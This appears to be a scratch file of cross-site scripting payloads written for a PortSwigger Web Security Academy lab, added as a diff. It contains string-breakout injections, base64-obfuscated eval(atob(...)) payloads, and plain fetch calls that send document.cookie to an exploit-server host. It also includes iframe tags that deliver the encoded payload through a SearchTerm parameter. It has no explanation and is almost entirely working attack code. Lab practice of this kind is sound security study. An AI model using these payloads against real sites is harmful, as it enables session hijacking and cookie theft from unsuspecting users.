@@ -1,0 +1,27 @@
+using payload:
+"+alert(document['cookie'])}//
+
+
+"+eval(atob("ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYTM4MDA1YjA0N2FlNzgwODI4MmE2MDcwMTMyMDAyZC5leHBsb2l0LXNlcnZlci5uZXQvP2M9JytidG9hKGRvY3VtZW50Wydjb29raWUnXSkp"))}//
+
+<iframe src = "https://0a5b00340465e70082c1a72d00fe00f6.web-security-academy.net/?SearchTerm=%22%2Beval%28atob%28%22ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYTM4MDA1YjA0N2FlNzgwODI4MmE2MDcwMTMyMDAyZC5leHBsb2l0LXNlcnZlci5uZXQvP2M9JytidG9hKGRvY3VtZW50Wydjb29raWUnXSkp%22%29%29%7D%2F%2F"/>
+
+
+"+eval(alert(atob("ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYWRhMDA3NjA0ZGYxZTkyODE0ZTQyZmQwMWY2MDAwMy5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8/Yz0nK2VuY29kZVVSSUNvbXBvbmVudChidG9hKGRvY3VtZW50LmNvb2tpZSkpKQ==")))}//
+
+fetch('https://exploit-0a38005b047ae7808282a6070132002d.exploit-server.net/?c='+btoa(document['cookie'])')
+
+"+eval(alert(atob("ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYWRhMDA3NjA0ZGYxZTkyODE0ZTQyZmQwMWY2MDAwMy5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdCcp")))}//
+
+fetch('https://exploit-0ada007604df1e92814e42fd01f60003.exploit-server.net/exploit')
+
+
+
+"+eval(alert(atob("ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYWRhMDA3NjA0ZGYxZTkyODE0ZTQyZmQwMWY2MDAwMy5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8/Yz0nK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSkn")))}//
+
+fetch('https://exploit-0ada007604df1e92814e42fd01f60003.exploit-server.net/exploit/?c='+btoa(document['cookie']))'
+
+
+fetch('https://exploit-0ada007604df1e92814e42fd01f60003.exploit-server.net/exploit/?c='+btoa(document['cookie']))'
+
+<iframe src="https://0a2b004604031e36811f438300e0006d.web-security-academy.net/?SearchTerm=%22%2Beval%28atob%28%22ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYWRhMDA3NjA0ZGYxZTkyODE0ZTQyZmQwMWY2MDAwMy5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8%2FYz0nK2VuY29kZVVSSUNvbXBvbmVudChidG9hKGRvY3VtZW50LmNvb2tpZSkpKQ%3D%3D%22%29%29%7D%2F%2F"/>
